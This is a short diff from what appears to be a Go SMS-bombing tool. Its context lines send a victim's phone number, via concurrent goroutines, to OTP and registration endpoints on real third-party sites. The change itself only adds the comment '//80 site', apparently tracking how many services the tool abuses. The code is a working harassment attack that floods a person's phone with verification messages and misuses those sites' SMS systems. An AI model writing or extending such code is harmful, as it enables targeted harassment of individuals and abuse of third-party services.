@@ -573,6 +573,7 @@ func main() {
 		go sms("https://api.watchonline.shop/api/v1/otp/request", map[string]interface{}{
 			"mobile": phone,
 		}, ch)
+//80 site
 		s1 := fmt.Sprintf("'phoneNumber':%s ,'email':''", phone)
 		go sms("https://abantether.com/users/register/phone/send/", map[string]interface{}{
 			s1: phone,
